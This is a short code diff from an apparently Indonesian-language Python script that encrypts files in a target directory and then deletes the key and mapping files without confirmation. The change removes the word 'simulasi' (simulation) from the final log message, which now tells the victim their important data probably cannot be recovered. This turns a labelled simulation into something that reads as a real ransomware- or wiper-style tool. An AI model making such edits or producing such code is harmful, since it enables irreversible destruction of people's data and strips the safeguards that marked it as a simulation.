@@ -167,7 +167,7 @@ def main():
     # HAPUS KUNCI DAN MAPPING SETELAH SELESAI (TANPA KONFIRMASI)
     delete_key_and_map(TARGET_DIR)
 
-    logging.info("Enkripsi selesai. File kunci dan mapping telah dihapus. Data Anda tidak dapat dipulihkan (simulasi).")
+    logging.info("Enkripsi selesai, Kemungkinan data² penting Anda tidak dapat dipulihkan.")
 
 if __name__ == "__main__":
     main()
